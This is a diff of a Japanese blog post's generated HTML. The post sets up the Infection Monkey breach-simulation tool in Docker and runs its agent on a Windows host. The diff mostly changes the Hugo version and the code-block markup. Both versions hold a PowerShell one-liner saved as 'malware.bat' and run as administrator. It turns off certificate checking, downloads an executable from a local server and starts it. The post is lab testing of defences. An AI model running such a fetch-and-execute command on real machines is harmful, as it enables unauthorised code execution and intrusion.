@@ -25,7 +25,7 @@
     <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="generator" content="Hugo 0.91.2 with theme Tranquilpeak 0.5.3-BETA">
+<meta name="generator" content="Hugo 0.96.0 with theme Tranquilpeak 0.5.3-BETA">
 <meta name="author" content="tatsui">
 <meta name="keywords" content="">
 <meta name="description" content="プライベートまたはパブリックなクラウド環境の侵害をシュミレーション・評価するためのツールである
@@ -327,11 +327,11 @@ Infection Monkeyを動かしてみました。</p>
 </li>
 </ul>
 <h2 id="infection-monkeyのセットアップ">infection monkeyのセットアップ</h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ git clone https://github.com/guardicore/monkey
-$ monkey/docker
-$ docker-compose build
-$ docker-compose up -d
-</code></pre></div><p>Dockerを動かしているマシンのブラウザからこちらのURLにアクセスすると下記のような画面が出力されます。
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>$ git clone https://github.com/guardicore/monkey
+</span></span><span style="display:flex;"><span>$ monkey/docker
+</span></span><span style="display:flex;"><span>$ docker-compose build
+</span></span><span style="display:flex;"><span>$ docker-compose up -d
+</span></span></code></pre></div><p>Dockerを動かしているマシンのブラウザからこちらのURLにアクセスすると下記のような画面が出力されます。
 <a href="https://localhost:5000/">https://localhost:5000/</a></p>
 <p><img src="https://i.imgur.com/HH720sZ.png" alt=""></p>
 <h2 id="動作検証">動作検証</h2>
@@ -342,7 +342,7 @@ powershellコマンドのワンライナーが表示されます</p>
 <p><img src="https://i.imgur.com/dZ3Yb16.png" alt=""></p>
 <p>malware.batという名前で上記で表示された文字列を貼り付けます。
 私の環境では接続先が<code>172.22.0.3</code>となっていましたが、dockerを実行しているマシンのIPアドレスが<code>192.168.11.251</code>であったので、バッチファイルを少し変更しました。</p>
-<pre tabindex="0"><code>powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile('https://192.168.11.251:5000/api/monkey/download/monkey-windows-32.exe','.\monkey.exe'); ;Start-Process -FilePath '.\monkey.exe' -ArgumentList 'm0nk3y -s 192.168.11.251:5000';
+<pre tabindex="0"><code>powershell [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}; (New-Object System.Net.WebClient).DownloadFile(&#39;https://192.168.11.251:5000/api/monkey/download/monkey-windows-32.exe&#39;,&#39;.\monkey.exe&#39;); ;Start-Process -FilePath &#39;.\monkey.exe&#39; -ArgumentList &#39;m0nk3y -s 192.168.11.251:5000&#39;;
 </code></pre><p>バッチファイルは<code>管理者権限</code>で実行します。
 <img src="https://i.imgur.com/gRU7RoS.png" alt=""></p>
 <p>実行するとコマンドプロンプトが起動し、メッセージがたくさん表示されます。
